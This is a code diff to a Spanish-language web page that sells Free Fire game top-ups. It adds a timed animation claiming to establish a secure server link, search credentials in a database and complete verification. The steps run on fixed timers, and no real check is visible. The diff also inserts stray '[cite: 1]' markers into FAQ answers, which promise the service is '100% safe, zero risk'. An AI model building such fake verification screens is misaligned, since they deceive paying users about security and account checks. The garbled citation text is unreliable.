@@ -220,6 +220,65 @@
             100% { opacity: 0.3; transform: scale(0.9); }
         }
 
+        /* --- Estilos para la Animación de Carga Detallada --- */
+        .loading-steps-container {
+            display: none;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 15px;
+            text-align: left;
+        }
+
+        .loading-step-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            opacity: 0.4;
+            transition: opacity 0.3s ease, color 0.3s ease;
+        }
+
+        .loading-step-item.active {
+            opacity: 1;
+            color: var(--text-main);
+            font-weight: 600;
+        }
+
+        .loading-step-item.completed {
+            opacity: 1;
+            color: var(--ios-green);
+        }
+
+        .step-icon {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        .progress-bar-wrapper {
+            width: 100%;
+            height: 6px;
+            background: rgba(0, 0, 0, 0.05);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 15px;
+            display: none;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .progress-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--ios-blue), var(--ios-green));
+            border-radius: 10px;
+            transition: width 0.4s ease;
+        }
+
         .game-choice-grid {
             display: flex;
             flex-direction: column;
@@ -807,8 +866,28 @@
         <div id="contenedorInputsLogin">
             <input type="text" id="idInput" placeholder="Ingresa tu UID de Free Fire" inputmode="numeric">
         </div>
+
+        <!-- Barra de Progreso y Pasos Detallados -->
+        <div class="progress-bar-wrapper" id="progressBarWrapper">
+            <div class="progress-bar-fill" id="progressBarFill"></div>
+        </div>
+
+        <div class="loading-steps-container" id="loadingStepsContainer">
+            <div class="loading-step-item" id="step1">
+                <div class="step-icon">⏳</div>
+                <span>Estableciendo enlace seguro con el servidor...</span>
+            </div>
+            <div class="loading-step-item" id="step2">
+                <div class="step-icon">⏳</div>
+                <span>Buscando credenciales en la base de datos...</span>
+            </div>
+            <div class="loading-step-item" id="step3">
+                <div class="step-icon">⏳</div>
+                <span>¡Verificación completada con éxito!</span>
+            </div>
+        </div>
         
-        <button class="ios-button-style" id="btnLogin">Verificar</button>
+        <button class="ios-button-style" id="btnLogin" style="margin-top: 15px;">Verificar</button>
         <button class="ios-button-style danger" id="btnAtrasSeleccionJuego">Cambiar Juego</button>
 
         <div class="faq-wrapper">
@@ -817,21 +896,21 @@
             <div class="faq-item">
                 <button class="faq-trigger" onclick="toggleFaq(this)">¿Cuánto tarda en llegar?</button>
                 <div class="faq-content">
-                    <p style="margin:0;">Las recargas se procesan de inmediato y llegan a tu cuenta en menos de 5 minutos una vez confirmado tu pago.</p>
+                    <p style="margin:0;">Las recargas se procesan de inmediato y llegan a tu cuenta en menos de 5 minutos una vez confirmado tu pago[cite: 1].</p>
                 </div>
             </div>
 
             <div class="faq-item">
                 <button class="faq-trigger" onclick="toggleFaq(this)">¿Es seguro o hay riesgo de baneo?</button>
                 <div class="faq-content">
-                    <p style="margin:0;">Es 100% seguro. Las recargas se hacen directamente por los canales oficiales, cero riesgo.</p>
+                    <p style="margin:0;">Es 100% seguro. Las recargas se hacen directamente por los canales oficiales, cero riesgo[cite: 1].</p>
                 </div>
             </div>
 
             <div class="faq-item">
                 <button class="faq-trigger" onclick="toggleFaq(this)">¿Qué métodos de pago aceptan?</button>
                 <div class="faq-content">
-                    <p style="margin:0;">Aceptamos Pago Móvil nacional (Bs), Binance Pay (USDT) y saldo de PayPal.</p>
+                    <p style="margin:0;">Aceptamos Pago Móvil nacional (Bs), Binance Pay (USDT) y saldo de PayPal[cite: 1].</p>
                 </div>
             </div>
         </div>
@@ -1201,6 +1280,10 @@
         const idInput = document.getElementById('idInput');
         const btnLogin = document.getElementById('btnLogin');
         const cardLogin = document.getElementById('seccionLogin');
+        const progressBarWrapper = document.getElementById('progressBarWrapper');
+        const progressBarFill = document.getElementById('progressBarFill');
+        const loadingStepsContainer = document.getElementById('loadingStepsContainer');
+        
         jugadorId = idInput.value.trim();
 
         if (juegoSeleccionado === "Free Fire") {
@@ -1220,11 +1303,14 @@
         }
 
         cardLogin.classList.add('verificando');
-        btnLogin.innerText = "Esteban esta verificando...";
-        btnLogin.disabled = true; 
+        btnLogin.style.display = 'none';
+        document.getElementById('btnAtrasSeleccionJuego').style.display = 'none';
         idInput.disabled = true;
         const passInputRef = document.getElementById('passwordInput');
         if (passInputRef) passInputRef.disabled = true;
+
+        progressBarWrapper.style.display = 'block';
+        loadingStepsContainer.style.display = 'flex';
 
         localStorage.setItem('esteban_last_id', jugadorId);
 
@@ -1237,14 +1323,55 @@
             }).catch(function() { }); 
         }
 
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+
+        step1.classList.add('active');
+        progressBarFill.style.width = '33%';
+
+        setTimeout(() => {
+            step1.classList.remove('active');
+            step1.classList.add('completed');
+            step1.querySelector('.step-icon').innerText = '✅';
+            
+            step2.classList.add('active');
+            progressBarFill.style.width = '66%';
+        }, 1000);
+
+        setTimeout(() => {
+            step2.classList.remove('active');
+            step2.classList.add('completed');
+            step2.querySelector('.step-icon').innerText = '✅';
+            
+            step3.classList.add('active');
+            progressBarFill.style.width = '100%';
+        }, 2200);
+
         setTimeout(function() {
+            step3.classList.remove('active');
+            step3.classList.add('completed');
+            step3.querySelector('.step-icon').innerText = '✅';
+
             cardLogin.classList.remove('verificando'); 
-            btnLogin.innerText = "Verificar Cuenta";
-            btnLogin.disabled = false; 
+            
+            btnLogin.style.display = 'block';
+            document.getElementById('btnAtrasSeleccionJuego').style.display = 'block';
+            btnLogin.innerText = "Verificar";
             idInput.disabled = false;
             if (passInputRef) passInputRef.disabled = false;
+            progressBarWrapper.style.display = 'none';
+            loadingStepsContainer.style.display = 'none';
+            progressBarFill.style.width = '0%';
+            
+            ['step1', 'step2', 'step3'].forEach(id => {
+                const el = document.getElementById(id);
+                el.classList.remove('completed');
+                el.querySelector('.step-icon').innerText = '⏳';
+            });
+
             cambiarPantalla('seccionLogin', 'seccionRecarga');
-        }, 3000);
+        }, 3200);
     });
 
     document.addEventListener('click', function(e) {
@@ -1597,7 +1724,6 @@
         setInterval(showNextHypeNotification, 12000);
     }, 3000);
 
-    // --- Lógica del Asistente IA ---
     const aiToggleBtn = document.getElementById('aiToggleBtn');
     const aiChatContainer = document.getElementById('aiChatContainer');
     const aiCloseBtn = document.getElementById('aiCloseBtn');
@@ -1646,4 +1772,3 @@
 </script>
 </body>
 </html>
-
